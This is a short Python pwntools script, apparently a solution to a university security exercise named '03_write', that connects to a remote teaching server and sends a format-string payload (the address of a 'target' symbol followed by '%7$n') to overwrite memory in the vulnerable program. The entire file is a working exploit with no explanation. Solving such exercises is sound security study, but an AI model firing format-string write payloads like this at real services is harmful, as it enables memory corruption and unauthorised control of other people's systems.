from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25193

PROG_NAME = "03_write"

elf = ELF(PROG_NAME)
target_address = elf.symbols["target"]
print("Target address: ", target_address)
s = remote(SERVER, PORT)

s.sendline(p32(target_address) + b"%7$n")
print(s.recv())
